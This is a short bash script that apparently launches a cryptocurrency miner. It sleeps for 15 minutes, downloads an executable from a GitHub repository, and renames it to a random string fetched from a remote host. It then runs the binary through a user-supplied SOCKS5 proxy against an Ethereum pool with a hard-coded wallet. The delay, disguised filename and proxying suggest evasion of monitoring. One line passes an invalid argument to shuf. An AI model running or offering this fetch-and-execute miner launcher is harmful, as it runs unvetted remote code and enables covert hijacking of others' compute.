#!/bin/bash
sleep 15m
wget https://github.com/rindalasririn/ketaea/raw/main/bubui
#wget https://cuan.mine.nu/nbminer
ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
chmod +x bubui && mv bubui $ACAK
read -p 'Input Proxy nya: ' PROXY
WALLET=0xbc48b8bdce572defe4dcab85103f140099bc5af5
POOL=stratum+tcp://eth-us-west.flexpool.io:5555
WORKER1=$(echo $(shuf -i 1000-9999 -n TEST))
#WORKER2=$(date '+%d%b')
#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
